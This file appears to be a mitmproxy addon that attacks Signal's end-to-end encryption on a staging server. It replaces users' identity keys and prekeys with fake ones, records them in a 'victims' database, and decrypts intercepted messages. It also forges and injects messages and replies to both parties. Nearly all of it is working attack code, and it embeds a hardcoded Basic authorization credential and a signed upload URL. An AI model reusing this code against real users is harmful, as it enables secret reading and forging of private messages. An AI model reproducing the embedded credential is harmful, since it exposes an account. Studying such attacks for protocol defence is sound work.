import subprocess
import os
import json
import requests
import random
from mitmproxy import flow, http, ctx
import sqlite3
from setup import setup_db
import base64
import re
from proto_python.wire_pb2 import *
from proto_python.SignalService_pb2 import *
from proto_python.storage_pb2 import *
from proto_python.WebSocketResources_pb2 import *
from proto_python.SignalService_pb2 import *
from proto_python.sealed_sender_pb2 import *
from proto_python import *
from test_protocol_wip import *
from kyber_protocol import kyber

protocol_runs = dict()
once = False

def try_run_sudo(cmd):
    try_run(f"sudo {cmd}")

def try_except(success, failure, *exceptions):
    try:
        return success()
    except exceptions or Exception:
        return failure() if callable(failure) else failure
    
def try_run(cmd: str):
    try:
        res = subprocess.run(cmd, shell=True, check=True, stdout=open(os.devnull, "wb"))
        # print(res.returncode)
    except subprocess.CalledProcessError as e:
        print(f"cmd fucked: {e}\n{cmd}")


def get_or_create_identityKey(conn: sqlite3.Connection, sender: str, recv: str, deviceID: int,  recv_IdenKey: str) ->str:
    #TODO generate profile key
    cur = conn.cursor()

    statement = '''
    INSERT OR IGNORE INTO end2end (v_aci, recv_aci, deviceId, recv_IdenKey, recv_FakeIdenKey) VALUES (?,?,?,?,?)
    '''
    recv_FakeIdenKey = json.dumps(fake_key_gen_curve()["identityKey"])
    ctx.log.warn((sender,recv, recv_IdenKey, recv_FakeIdenKey))

    cur.execute(statement,(sender,recv, deviceID, recv_IdenKey,  recv_FakeIdenKey,))
    conn.commit()
    
    qry = '''
    SELECT recv_FakeIdenKey FROM end2end WHERE v_aci = ? AND recv_aci = ? AND deviceId = 1 AND recv_IdenKey = ?;
    '''
    res = cur.execute(qry, (sender, recv, recv_IdenKey,)).fetchone()
    ctx.log.warn(res)
    ctx.log.warn(res)
    if res is None:
        print("sth went terribly wrong!")
    return json.loads(res[0])['publicKey']

def fake_key_gen_krystal():
    fake_key = kyber.Kyber1024()
    pk, sk = fake_key.keygen()
    
    

def fake_key_gen_curve(preKeysId=1, signedKeyId=1): # CHANGE
    try_run("node ./node-signal/index.js")

    p = subprocess.Popen(
        ["node", "./node-signal/index.js", "100"], stdout=subprocess.PIPE
    )
    out = p.stdout.read()

    keys = json.loads(out)

    identity_key = {"privateKey":keys["identityKey"]["privateKey"], "publicKey":keys["identityKey"]["publicKey"]}
    signedPre_key = (
        keys["signedPreKey"]["privateKey"],
        keys["signedPreKey"]["publicKey"],
        keys["signedPreKey"]["signature"],
    )

    preKeys = [(i["privKey"], i["pubKey"]) for i in keys["preKeys"]]

    #print(identity_key, signedPre_key, preKeys)

    fake_keys = {
        "identityKey": identity_key,
        "preKeys": [
            {"keyId": preKeysId + id, "publicKey": keyPair[1], "privateKey": keyPair[0]}
            for id, keyPair in enumerate(preKeys)
        ],
        "signedPreKey": {
            "keyId": signedKeyId,
            "publicKey": signedPre_key[1],
            "privateKey": signedPre_key [0],
            "signature": signedPre_key[2],
        },
    }

    # fake_keys_json = json.dumps(fake_keys, indent=4)
    one_time_keys = fake_keys

    headers = {
        "Authorization": "Basic ZTdkNzFhZWEtYzQxYS00ZDg4LTg1NmItMDJlOTc5OTg4NjNhOjRvd1dGeGRGR2FqeXFPOHJrUTFmTUJkVA==",
        "X-Signal-Agent": "OWA",
        "User-Agent": "Signal-Android/6.18.4 Android/31",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "chat.staging.signal.org",
        "Connection": "Keep-Alive",
    }

    return fake_keys


def isKnownUser(cur: sqlite3.Cursor, target: str) -> bool:
    query = f"SELECT * FROM victims WHERE pNumber = ? OR aci = ? ;"
    params = (target, target)
    result = cur.execute(query, params).fetchall()
    return len(result) > 0


def request(flow: http.HTTPFlow):
    conn = sqlite3.connect("mitm.db")
    cur = conn.cursor()

    # before checking the request, let's see if we know this bastard
    bearer = flow.request.headers.get("Authorization", None)
    knownUser, target = False, ""
    if bearer is not None:
        bearer = bearer.split("Basic ")[1]
        # base64.decode(bearer)
        target = base64.b64decode(bearer).split(b":")[0].decode()
        # sql query to check if target in aci or pnumber
        knownUser = isKnownUser(cur, target)
        # ctx.log(f"Bearer token: {bearer} (known: {knownUser})")
        # ctx.log(target)
        
    if "/v1/registration" in flow.request.path and flow.request.method == "POST":
            try:
                resp = json.loads(flow.response.content)
                req = json.loads(flow.request.content)
            except Exception as e:
                ctx.log.error(f"{e.msg},\n\t{flow.response.content.decode()}")
            with open("resp.json", "w") as f:
                f.write(json.dumps(resp))
            ctx.log.warn(json.dumps(req, indent=4))

            aci_IdenKey = req['aciIdentityKey']
            pni_IdenKey = req['pniIdentityKey']
            
            aci_SignedPreKey = req['aciSignedPreKey']
            pni_SignedPreKey = req['pniSignedPreKey']

            aci_fake_keys = fake_key_gen_curve(
                signedKeyId=req["aciSignedPreKey"]["keyId"],
                preKeysId=1,
            )
            
            aci_fake_IdenKey = aci_fake_keys["identityKey"]
            aci_fake_SignedPreKey = aci_fake_keys["signedPreKey"]

            pni_fake_keys = fake_key_gen_curve(
                signedKeyId=req["pniSignedPreKey"]["keyId"],
                preKeysId=1,
            )
            pni_fake_IdenKey = pni_fake_keys["identityKey"]
            pni_fake_SignedPreKey = pni_fake_keys["signedPreKey"]
            
            for identity in ["aci", "pni"]:
                
                query = f"UPDATE victims SET aciIdenKey = ?, aciSignedPreKey = ?, pniIdenKey = ?, pniSignedPreKey = ?, aciFakeIdenKey = ?, aciFakeSignedPreKey = ?, pniFakeIdenKey = ?, pniFakeSignedPreKey = ? WHERE pNumber = ? OR aci = ?"
                params = (
                    json.dumps(aci_IdenKey),
                    json.dumps(aci_SignedPreKey),
                    json.dumps(pni_IdenKey),
                    json.dumps(pni_SignedPreKey),
                    json.dumps(aci_fake_IdenKey),
                    json.dumps(aci_fake_SignedPreKey),
                    json.dumps(pni_fake_IdenKey),
                    json.dumps(pni_fake_SignedPreKey),
                    target,
                    target,
                )

                cur.execute(query, params)

            conn.commit()
            
            req['aciIdentityKey'] = aci_fake_keys["identityKey"]["publicKey"]
            req['pniIdentityKey'] = pni_fake_keys["identityKey"]["publicKey"]
            #req['deviceActivationRequest'] = {}
            req['aciPqLastResortPreKey'] = aci_fake_keys["signedPreKey"]["publicKey"]
            req['pniPqLastResortPreKey'] = pni_fake_keys["signedPreKey"]["publicKey"]
            aci_fake_keys["signedPreKey"].pop("privateKey")
            pni_fake_keys["signedPreKey"].pop("privateKey")
            req['aciSignedPreKey'] = aci_fake_keys["signedPreKey"]
            req['pniSignedPreKey'] = pni_fake_keys["signedPreKey"]
            req['exactlyOneMessageDeliveryChannel'] = ""
            req['everySignedKeyValid'] = ""
            ctx.log.warn(json.dumps(req, indent=4))
    
            conn = sqlite3.connect("mitm.db")
            cur = conn.cursor()
            try:
                pNumber, aci, pni, unidentifiedAccessKey = (
                    resp["number"],
                    resp["uuid"],
                    resp["pni"],
                    req["accountAttributes"]["unidentifiedAccessKey"],
                )
                cur.execute(
                    f"""INSERT INTO victims (pNumber, aci, pni, unidentifiedAccessKey, aciIdenKey, pniIdenKey, aciSignedPreKey, pniSignedPreKey, aciPreKeys, pniPreKeys,aciFakeIdenKey, pniFakeIdenKey, aciFakeSignedPreKey, pniFakeSignedPreKey, aciFakePrekeys, pniFakePreKeys) VALUES (?, ?, ?, ?, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )""",
                    (pNumber, aci, pni, unidentifiedAccessKey),
                )
                conn.commit()
            except Exception:
                pass
    if "/v2/keys" in flow.request.path and flow.request.method == "PUT":
        # make it a method, for example (replace_keys())
        if not knownUser:
            # well... nothing to do here,
            pass
        keys = {}
        try:
            keys = json.loads(flow.request.content)
        except Exception as e:
            ctx.log.error(f"{e.msg},\n\t{flow.request.content.decode()}")
        ts = flow.timestamp_created
        identity = flow.request.query.get("identity")
        with open(f"saved/{ts}-{identity}-keys.json", "w") as f:
            f.write(json.dumps(keys))

        # pNumber, aci, pni = info["number"], info["uuid"], info["pni"]

        IdenKey, SignedPreKey, PreKeys = (
            json.dumps(keys["identityKey"]),
            json.dumps(keys["signedPreKey"]),
            json.dumps(keys["preKeys"]),
        )

        fake_keys = fake_key_gen_curve(
            signedKeyId=1,
            preKeysId=keys["preKeys"][0]["keyId"],
        )
        ctx.log.warn(fake_keys)
                
        fake_IdenKeyDict, fake_SignedPreKeyDict, fake_PreKeysDict = (
            (fake_keys["identityKey"]),
            (fake_keys["signedPreKey"]),
            (fake_keys["preKeys"]),
        )
        
        fake_IdenKey, fake_SignedPreKey, fake_PreKeys = (
            json.dumps(fake_keys["identityKey"]),
            json.dumps(fake_keys["signedPreKey"]),
            json.dumps(fake_keys["preKeys"]),
        )
        ctx.log.alert((fake_IdenKey, fake_SignedPreKey, fake_PreKeys))

        query = f"UPDATE victims SET {identity}PreKeys = ?, {identity}FakePreKeys = ? WHERE pNumber = ? OR aci = ?"
        params = (
            PreKeys,
            fake_PreKeys,
            target,
            target,
        )

        cur.execute(query, params)

        conn.commit()
        ctx.log.info(f"Updated {identity} keys for target {target}")
        fake_IdenKey = cur.execute(f"SELECT {identity}FakeIdenKey from victims").fetchone()
        ctx.log.warn(fake_IdenKey[0])
        # keys["preKeys"] = fa["preKeys"]
        fake_keys["identityKey"] = json.loads(fake_IdenKey[0])["publicKey"]
        fake_keys["signedPreKey"]= None
        for i in range(len(fake_keys)):
            del fake_keys["preKeys"][i]["privateKey"]
        flow.request.content = json.dumps(fake_keys).encode()
        with open(f"saved/fake-{ts}-{identity}-keys.json", "wb") as f:
            f.write(flow.request.content)


def response(flow: http.HTTPFlow):
    conn = sqlite3.connect("mitm.db")
    cur = conn.cursor()

    # before checking the request, let's see if we know this bastard
    bearer = flow.request.headers.get("Authorization", None)

    knownUser, target = False, ""
    if bearer is not None:
        bearer = bearer.split("Basic ")[1]
        # base64.decode(bearer)
        target = base64.b64decode(bearer).split(b":")[0].decode()
        # sql query to check if target in aci or pnumber
        knownUser = isKnownUser(cur, target)

    # if "/v1/registration" in flow.request.path and flow.request.method == "POST":
    #     try:
    #         resp = json.loads(flow.response.content)
    #         req = json.loads(flow.request.content)
    #     except Exception as e:
    #         ctx.log.error(f"{e.msg},\n\t{flow.response.content.decode()}")
    #     with open("resp.json", "w") as f:
    #         f.write(json.dumps(resp))
    #     ctx.log.warn(json.dumps(req, indent=4))

    #     aci_IdenKey = req['aciIdentityKey']
    #     pni_IdenKey = req['pniIdentityKey']
        
    #     aci_SignedPreKey = req['aciSignedPreKey']
    #     pni_SignedPreKey = req['pniSignedPreKey']

    #     aci_fake_keys = fake_key_gen(
    #         signedKeyId=req["aciSignedPreKey"]["keyId"],
    #         preKeysId=1,
    #     )
        
    #     aci_fake_IdenKey = aci_fake_keys["identityKey"]
    #     aci_fake_SignedPreKey = aci_fake_keys["signedPreKey"]

    #     pni_fake_keys = fake_key_gen(
    #         signedKeyId=req["pniSignedPreKey"]["keyId"],
    #         preKeysId=1,
    #     )
    #     pni_fake_IdenKey = pni_fake_keys["identityKey"]
    #     pni_fake_SignedPreKey = pni_fake_keys["signedPreKey"]
        
    #     for identity in ["aci", "pni"]:
            
    #         query = f"UPDATE victims SET aciIdenKey = ?, aciSignedPreKey = ?, pniIdenKey = ?, pniSignedPreKey = ?, aciFakeIdenKey = ?, aciFakeSignedPreKey = ?, pniFakeIdenKey = ?, pniFakeSignedPreKey = ? WHERE pNumber = ? OR aci = ?"
    #         params = (
    #             json.dumps(aci_IdenKey),
    #             json.dumps(aci_SignedPreKey),
    #             json.dumps(pni_IdenKey),
    #             json.dumps(pni_SignedPreKey),
    #             json.dumps(aci_fake_IdenKey),
    #             json.dumps(aci_fake_SignedPreKey),
    #             json.dumps(pni_fake_IdenKey),
    #             json.dumps(pni_fake_SignedPreKey),
    #             target,
    #             target,
    #         )

    #         cur.execute(query, params)

    #     conn.commit()
        
    #     req['aciIdentityKey'] = aci_fake_keys["identityKey"]["publicKey"]
    #     req['pniIdentityKey'] = pni_fake_keys["identityKey"]["publicKey"]
    #     #req['deviceActivationRequest'] = {}
    #     req['aciPqLastResortPreKey'] = aci_fake_keys["signedPreKey"]["publicKey"]
    #     req['pniPqLastResortPreKey'] = pni_fake_keys["signedPreKey"]["publicKey"]
    #     aci_fake_keys["signedPreKey"].pop("privateKey")
    #     pni_fake_keys["signedPreKey"].pop("privateKey")
    #     req['aciSignedPreKey'] = aci_fake_keys["signedPreKey"]
    #     req['pniSignedPreKey'] = pni_fake_keys["signedPreKey"]
    #     req['exactlyOneMessageDeliveryChannel'] = ""
    #     req['everySignedKeyValid'] = ""
    #     ctx.log.warn(json.dumps(req, indent=4))
  
    #     conn = sqlite3.connect("mitm.db")
    #     cur = conn.cursor()
    #     try:
    #         pNumber, aci, pni, unidentifiedAccessKey = (
    #             resp["number"],
    #             resp["uuid"],
    #             resp["pni"],
    #             req["accountAttributes"]["unidentifiedAccessKey"],
    #         )
    #         cur.execute(
    #             f"""INSERT INTO victims (pNumber, aci, pni, unidentifiedAccessKey, aciIdenKey, pniIdenKey, aciSignedPreKey, pniSignedPreKey, aciPreKeys, pniPreKeys,aciFakeIdenKey, pniFakeIdenKey, aciFakeSignedPreKey, pniFakeSignedPreKey, aciFakePrekeys, pniFakePreKeys) VALUES (?, ?, ?, ?, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )""",
    #             (pNumber, aci, pni, unidentifiedAccessKey),
    #         )
    #         conn.commit()
    #     except Exception:
    #         pass

    matches = re.match("\/v2\/keys\/([\w+-]+)\/(\*|\d)", flow.request.path)
    if matches and flow.request.method == "GET":
        ctx.log.warn("Before GET request")
        groups = matches.groups()
        # ctx.log(f"regex matched: {groups}")
        if len(groups) != 2:
            ctx.log.error("sth is fucked")
        receiver, deviceID = groups[0], groups[1] if groups[1] != "*" else None
        
        try:
            info = json.loads(flow.response.content)
        except Exception as e:
            ctx.log.error(f"{e.msg},\n\t{flow.response.content.decode()}")

        # fake_keys = fake_key_gen(preKeysId=info['devices'])
        # fake_IdenKey, fake_SignedPreKey, fake_PreKeys = fake_keys["identityKey"], json.dumps(fake_keys["signedPreKey"]), json.dumps(fake_keys["preKeys"])

        ctx.log.alert((target))
        if target is None or target == "":
            bearer = flow.request.headers.get("Unidentified-Access-Key", None)
            #ctx.log.alert(bearer)
            res = cur.execute(
                "SELECT aci FROM victims WHERE UnidentifiedAccessKey LIKE ? ", (bearer,)
            )
            #target = res.fetchone()[0]
        ctx.log.warn(flow.response.content)

        devices=None
        try :
            devices = info["devices"]
        except:
            ctx.log.debug("No info about devices")
            return
        
        for i, device in enumerate(devices):
            # ctx.log(params)
            fake_keys = fake_key_gen_curve(
                preKeysId=device["preKey"]["keyId"],
                signedKeyId=device["signedPreKey"]["keyId"],
            )
            fake_IdenKey, fake_SignedPreKey, fake_PreKeys = (
                json.dumps(fake_keys["identityKey"]),
                json.dumps(fake_keys["signedPreKey"]),
                json.dumps(fake_keys["preKeys"]),
            )
            params = (
                device["deviceId"],
                target,
                receiver,
                json.dumps(info["identityKey"]),
                json.dumps(device["signedPreKey"]),
                json.dumps(device["preKey"]),
                fake_IdenKey,
                fake_SignedPreKey,
                fake_PreKeys,
            )
            # index_to_remove = params.index(fake_IdenKey)
            
            # get_or_create_identityKey(conn, target, receiver, params[0], params[3])
            
            # try:
            #     params = params[:index_to_remove] + params[index_to_remove+1:] + (target, receiver, device["deviceId"],)
            #     cur.execute(
            #         f"UPDATE end2end SET deviceId = ?, v_aci = ?, recv_aci = ?, recv_IdenKey = ?, recv_SignedPreKey = ?, recv_PreKey = ?, recv_FakeSignedPreKey = ?, recv_FakePreKey = ? WHERE (v_aci = ? AND recv_aci = ? AND deviceId = ?)",
            #         params,
            #     )
            # except sqlite3.IntegrityError as e:
            #     ctx.log.error(f"Integrity error: {e}")
            ctx.log.error(f"params: {target}")
            
            cur.execute(
                f"UPDATE end2end SET deviceId = ?, v_aci = ?, recv_aci = ?, recv_IdenKey = ?, recv_SignedPreKey = ?, recv_PreKey = ?, recv_FakeIdenKey = ?, recv_FakeSignedPreKey = ?, recv_FakePreKey = ? WHERE (v_aci = ? AND recv_aci = ? AND deviceId = ?)",
                params + (target, receiver, device["deviceId"],),
            )
            cur.execute(
                "INSERT OR IGNORE INTO end2end (deviceId, v_aci, recv_aci, recv_IdenKey, recv_SignedPreKey, recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey) VALUES (?,?,?,?,?,?,?,?,?)",
                params,
            )
            # cur.execute(
            #     "INSERT OR IGNORE INTO end2end (deviceId, v_aci, recv_aci, recv_IdenKey, recv_SignedPreKey, recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey) VALUES (?,?,?,?,?,?,?,?,?)",
            #     params,
            # )
            # res = cur.execute("SELECT * from end2end")
            # ctx.log(res.fetchall())
            conn.commit()
            
            info['devices'][i]['signedPreKey']['publicKey'] = json.loads(fake_SignedPreKey)["publicKey"]
            info['devices'][i]['signedPreKey']['signature'] = json.loads(fake_SignedPreKey)["signature"]
            fake_PreKeys = json.loads(fake_PreKeys)
            keyId = info['devices'][i]['preKey']['keyId']
            ctx.log.error(info['devices'])
            info['devices'][i]['preKey']['publicKey'] = fake_PreKeys[0]['publicKey']
            info['identityKey'] = json.loads(fake_IdenKey)['publicKey']
        ctx.log.warn(info)
        flow.response.set_content(bytes(json.dumps(info),'utf-8'))

def websocket_message(flow: http.HTTPFlow):
    cont = flow.websocket.messages
    conn = sqlite3.connect("mitm.db")
    cur  = conn.cursor()
    msg = b''
    once = False
    #global protocol_runs
    
    # for messages in cont:
    messages = cont[-1]
    
    if True:
        pattern = b"/v1/messages"   
        profile_pattern = b"identityKey"
        
        proto_msg = WebSocketMessage()
        ctx.log.warn(f"messages {messages.content}")
        #proto_msg.ParseFromString(messages.content)
        ctx.log.warn(f"proto_msg {proto_msg}")
        
        # if profile_pattern in messages.content and messages.injected == False:
        #     messages.drop()
        #     sourceUUid = flow.request.path.split("login=")[1].split("&")[0]
        #     body = json.loads(proto_msg.response.body)
        #     recv_IdenKey = json.dumps(body['identityKey'])
        #     ctx.log.warn((sourceUUid, body['uuid']))
        #     if sourceUUid != body['uuid']:
        #         recv_FakeIdenKey = get_or_create_identityKey(conn, sourceUUid, body['uuid'], 1, recv_IdenKey)
        #     else:
        #         qry = '''
        #             SELECT aciIdenKey FROM victims WHERE aci = ?;
        #             '''
        #         recv_FakeIdenKey = cur.execute(qry, (sourceUUid,)).fetchone()[0]
        #         recv_FakeIdenKey = json.dumps(recv_FakeIdenKey)
                
                
        #     body['identityKey'] = recv_FakeIdenKey
        #     #if db is empty then we have to create a new entry fake IDKEY here
        #     # this means that when the sender request the keys we will require to produce the remaining keys
        #     # if BEFORE websocket profile GET request then we produce the fake key
        #     # otherwise we get it from the db
        #     # on the get request at that point we do not produce new fake id keys but we use the one we have
            
        #     serialized = json.dumps(body, separators=(',', ':'))
        #     proto_msg.response.body = bytes(serialized, 'utf-8')
        #     ctx.master.commands.call("inject.websocket",
        #             flow,
        #             True,
        #             proto_msg.SerializeToString(),
        #             False)
 

        match = re.match("\/v1\/messages\/([\w+-]+)\?story=([\w+-]+)", proto_msg.request.path)
        
        
        #if match and proto_msg.request.verb == "PUT":   
        if pattern in messages.content:
            proto_msg.ParseFromString(messages.content)        
            ctx.log.warn(flow.request.path)
            sourceUUid = flow.request.path.split("login=")[1].split("&")[0]
            ctx.log.warn(sourceUUid)
            #check the message type
            body = json.loads(proto_msg.request.body)                        
            ##### Protocol Run?
            recv = body['destination']
            
            ctx.log.warn(f'recv {recv}, source {sourceUUid}')
            
            # check if protocol is available
            msg_type = body['messages'][0]['type'] #check out for creating instances of protocol
            
            check = protocol_runs.get(sourceUUid+recv, None)
            
            if (msg_type == 3 and messages.injected == False):
                messages.drop()
                
                #if check is None:
                if True:

                    ### try to x3dh if contact never seen before
                    aliceToMitmKeys = cur.execute(f"SELECT recv_IdenKey, recv_SignedPreKey, recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey FROM end2end WHERE recv_aci = ? AND deviceId = 1;", (recv,)).fetchone()
                    ctx.log.warn((aliceToMitmKeys))
                
                    mitmToBobKeys = cur.execute(f"SELECT aciIdenKey, aciSignedPreKey, aciPreKeys, aciFakeIdenKey, aciFakeSignedPreKey, aciFakePreKeys FROM victims WHERE aci = ?", (sourceUUid,)).fetchone() 
                    ctx.log.warn((mitmToBobKeys))
                    
                    mitmAIK, mitmASPK, mitmOTK = json.loads(aliceToMitmKeys[3])["privateKey"], json.loads(aliceToMitmKeys[4])["privateKey"],json.loads(aliceToMitmKeys[5])
                    mitmBIK, mitmBSPK, mitmBOTK = json.loads(mitmToBobKeys[3])["privateKey"], json.loads(mitmToBobKeys[4])["privateKey"],json.loads(mitmToBobKeys[5])
                    bobIK, bobSPK, bobOTK = json.loads(aliceToMitmKeys[0]), json.loads(aliceToMitmKeys[1])["publicKey"],json.loads(aliceToMitmKeys[2])["publicKey"]

                    mitmA = Bob(privIK = hex2PrivKey(base64.b64decode(mitmAIK).hex()), privSPK = hex2PrivKey(base64.b64decode(mitmASPK).hex()), privOPK = hex2PrivKey(base64.b64decode(mitmOTK[0]['privateKey']).hex()))
                    mitmB = Alice(IK = hex2PrivKey(base64.b64decode(mitmBIK).hex()))

                    bob = Bob(pubIK = hex2PubKey(base64.b64decode(bobIK).hex()), pubSPK = hex2PubKey(base64.b64decode(bobSPK).hex()), pubOPK = hex2PubKey(base64.b64decode(bobOTK).hex()))
                    bob_bundle = KeyBundle(IK=bob.pubIK, SPK=bob.pubSPK, OPK=bob.pubOPK) ###check db, if they are the right keys
                    ctx.log.error((PubKey2Hex(bob_bundle.IK), PubKey2Hex(bob_bundle.SPK), PubKey2Hex(bob_bundle.OPK), PrivKey2Hex(mitmB.IK)))
                    
                    EncodedMessage = body['messages'][0]['content']
                    ctx.log.warn(f'Encoded Message {EncodedMessage}')
                    ctx.log.warn(EncodedMessage)
                    atm = AliceToMitm(bob = mitmA)
                    dec_msg = atm.BobReceive(EncodedMessage)
                    ctx.log.error(f"decrypted message {dec_msg}")

                    ############# COMPLETE HERE Mitm send to Bob
                    #mitmB.x3dh(bob_bundle)
                    mitmToBob = MitmToBob(alice = mitmB, bob = bob)
                    mitmToBob.handshake(bob_bundle) ### check if handshake sk is the same
                    msg_to_bob = mitmToBob.AliceSendPreKeySignalMessage(b"hey bob, you are dumb", EncodedMessage) ### check correctness of the message
                    ctx.log.error(f"msg to bob {base64.b64encode(msg_to_bob).decode('ASCII')}")
                    pksmToBob = WebSocketMessage()

                    pksmToBob.CopyFrom(proto_msg)
                    pksmToBobBody = json.loads(pksmToBob.request.body)
                    pksmToBobBody['messages'] = [pksmToBobBody['messages'][0]]
                    pksmToBobBody['messages'][0]['content'] = base64.b64encode(msg_to_bob).decode('ASCII')
                    serialized = json.dumps(pksmToBobBody, separators=(',', ':'))
                    pksmToBob.request.body = bytes(serialized, 'utf-8')
                    wire_pksmToBob = pksmToBob.SerializeToString()
                    ctx.log.warn(f"to Bob {wire_pksmToBob.hex()}")
                    if not once:
                        ctx.master.commands.call("inject.websocket",
                                                flow,
                                                False,
                                                wire_pksmToBob,
                                                False)
                        
                        
                    #### BOB replies MITM         
                        
                    msg = atm.BobSend(b"Thank you very much, I will take care!", b'bob profile key')
                    response = WebSocketMessage()
                    response.CopyFrom(proto_msg)

                    response.request.verb = "PUT"
                    response.request.path = "/api/v1/message"
                    seed = current_milli_time()
                    response.request.id = abs(nextLong(seed))
                    response.request.headers.append(f"content-type:application/json")
                    response.request.headers.append(f"X-Signal-Key: false")
                    response.request.headers.append(f"X-Signal-Timestamp: {current_milli_time()}")
                    responseEnvelope = Envelope()
                    responseEnvelope.type = 1
                    responseEnvelope.timestamp = current_milli_time()
                    responseEnvelope.serverGuid = "ef5d1433-c2df-4aeb-9863-5b88666f659b"
                    responseEnvelope.sourceUuid = recv
                    responseEnvelope.sourceDevice = 1
                    responseEnvelope.serverTimestamp = current_milli_time()
                    responseEnvelope.destinationUuid = sourceUUid
                    responseEnvelope.urgent = True
                    responseEnvelope.story = False
                    responseEnvelope.content = msg # base64.b64decode(msg)
                    ctx.log.warn(f"msg { msg.hex()}")
                    
                    response.request.body = responseEnvelope.SerializeToString()
                    
                    ack = WebSocketMessage()
                    ack.ParseFromString(bytes.fromhex("08021a5808f9b4e6cce8a0f4a26f10c8011a024f4b22137b226e6565647353796e63223a66616c73657d2a1d436f6e74656e742d547970653a6170706c69636174696f6e2f6a736f6e2a11436f6e74656e742d4c656e6774683a3139"))
                    ack.response.id = proto_msg.request.id
                    ctx.log.error(ack.response.id)
                    ack_wire = ack.SerializeToString()
                    last_message = flow.websocket.messages[-1]
                    if not once:
                        ctx.master.commands.call("inject.websocket",
                                                flow,
                                                last_message.from_client,
                                                ack_wire,
                                                False)
                        
                    wire_response = response.SerializeToString()
                    ctx.log.warn(f"wire_response {wire_response}")
                    if not once:
                        ctx.master.commands.call("inject.websocket",
                                            flow,
                                            last_message.from_client,
                                            wire_response,
                                            False)
                    once = True
                    
                    protocol_runs[sourceUUid+recv] = {atm, mitmToBob}
            
            
            # if (msg_type == 6 and messages.injected == False):
            #     messages.drop()
            #     ctx.log.warn("message type 6")
                
            #     aliceToMitm, mitmToBob = protocol_runs[sourceUUid+recv]
                
            #     unidentified_message = UnidentifiedSenderMessage()
            #     unidentified_message.ParseFromString()
                
                
                
                #ctx.log
            
            ## TODO: check if message is PrekeySignal or  SignalMessage
            # atm = AliceToMitm(bob = mitmA)
            # dec_msg = atm.BobReceive(EncodedMessage)
            # print(dec_msg)
            ############# COMPLETE HERE Mitm send to Bob
            # mitmB.x3dh(bob_bundle)
            # bob.x3dh(mitmB_bundle)
            # mitmToBob = MitmToBob(alice = mitmB, bob = bob)
            # msg_to_bob = mitmToBob.AliceSendSignalMessage(b"hey bob, you are dumb")
                #messages.drop()
                # other 
#        cur.execute("CREATE TABLE end2end(v_aci, recv_aci, deviceId,recv_IdenKey, recv_SignedPreKey, \
#            recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey, PRIMARY KEY (pNumber, aci, pni));")
### Changes safety number ###
### https://chat.staging.signal.org/v2/keys/signed?identity=pni catch this for new sessions
### /v1/profile catch this for the profile key
### 
# 2023-09-04 22:51:06.392 24005-24124 libsignal               org.thoughtcrime.securesms.staging   W  rust/protocol/src/protocol.rs:152: Bad Mac! Their Mac: 776083faf8d550bf Our Mac: fa5993da96ec897b
# 2023-09-04 22:51:06.396 24005-24124 libsignal               org.thoughtcrime.securesms.staging   W  rust/protocol/src/session_cipher.rs:405: Failed to decrypt PreKey message with ratchet key: 09f6eef69781beb8ce0aaa60af9ba39e44451f0ba62c4617fb7bfabe396bab4d and counter: 0. Session loaded for e7d71aea-c41a-4d88-856b-02e97998863a.1. Local session has base key: 33fa3a4a11f49b3111e2def201f4527b2b6c033b33b14fddd18b2e3fc5a75305 and counter: 0. invalid PreKey message: MAC verification failed
# 2023-09-04 22:51:06.400 24005-24124 libsignal               org.thoughtcrime.securesms.staging   E  rust/protocol/src/session_cipher.rs:504: No valid session for recipient: e7d71aea-c41a-4d88-856b-02e97998863a.1, current session base key 4ab29c95fd3cc11faf7ede2bb273e4aff9e72fc6b7e110f44bde987a13da7b47, number of previous states: 0
# 2023-09-04 22:51:06.402 24005-24124 libsignal               org.thoughtcrime.securesms.staging   E  rust/protocol/src/session_cipher.rs:518: Message from e7d71aea-c41a-4d88-856b-02e97998863a.1 failed to decrypt; sender ratchet public key 09f6eef69781beb8ce0aaa60af9ba39e44451f0ba62c4617fb7bfabe396bab4d message counter 0
#  
# https://cdn2-staging.signal.org/attachments/cwjOYfC-XhwG8HmY0XJb?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Credential=signal-service-staging%40signal-cdn.iam.gserviceaccount.com%2F20230905%2Fauto%2Fstorage%2Fgoog4_request&X-Goog-Date=20230905T084119Z&X-Goog-Expires=90000&X-Goog-SignedHeaders=host%3Bx-goog-content-length-range%3Bx-goog-resumable&X-Goog-Signature=8b23ebd65531f23ce136862d7bb39b9d55e66f0f4f39395c053a3e54fa2b28b943789db99d7d96314d8086ecaee332a6029293c9c563b7eb4db7816b438e52f44ba8b88ca4b2eb741cb9d766ac48fa0bbc735abf07d2a729cca91b5061924f550886b4519b967830cc6ab4ea1d2b292eec0b183919dadfb4fde2bbb5413844d30396d298f5a676785f15cb204cbc9229529b9f146b40566829f5bdb716a0c0c3dfae29443420bc91273544b36109db14a3e4f353402ab68bc5c8394478278655ac1fd1dfbfaf72eb9d0a01743b658f29b00b185b5f8e53aaaf0fd003023066bbe67edb0aeffdedfb3bd7fddc5d879fed64d3f7b007db10ef1615a930028fa914&upload_id=ADPycdsk95xDcH5Ho4Lf06FUdacc2bW81PeQxFkvesrAYg_ivZzYBi77sT5_a2OmnkVCsBHKKeR8x1VrtdwNRMbkWXd-beFXKmhG  
# Candidate session 0 failed with 'invalid PreKey message: MAC verification failed', had 0 receiver chains